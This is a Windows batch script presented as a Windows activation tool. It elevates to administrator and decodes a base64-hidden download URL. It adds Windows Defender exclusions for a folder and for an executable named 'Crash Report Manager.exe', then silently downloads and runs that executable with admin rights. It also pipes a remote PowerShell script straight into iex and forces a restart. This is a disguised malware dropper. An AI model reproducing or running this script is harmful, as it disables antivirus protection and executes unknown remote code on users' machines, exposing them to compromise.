@echo off
:: Check if the script is run as administrator using 'openfiles' command
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as an administrator.
    echo Attempting to restart with elevated privileges...
    pause
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs"
    exit /b
)

set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"


set "folder=%APPDATA%\Microsoft"
set "filename=%folder%\Crash Report Manager.exe"


powershell -Command "try { Add-MpPreference -ExclusionProcess '%filename%' } catch { }" >nul 2>&1
powershell -Command "try { Add-MpPreference -ExclusionPath '%folder%' } catch { }" >nul 2>&1


set "roaming_folder=%ProgramData%\Roaming\Microsoft"
powershell -Command "try { Add-MpPreference -ExclusionPath '%roaming_folder%' } catch { }" >nul 2>&1

powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1

if exist "%filename%" (
    powershell -Command "Start-Process '%filename%' -Verb runAs"
    
    echo Running the external PowerShell command...
    powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
) else (
    echo Failed to download the file. Exiting.
    exit /b
)

echo The system needs to restart for the changes to take effect.
echo Please wait while the system prepares for the restart...
echo Restart will occur in 3 minutes.

:: Wait for 3 minutes (180 seconds)
timeout /t 180 /nobreak

:: Restart the computer
shutdown /r /f /t 0
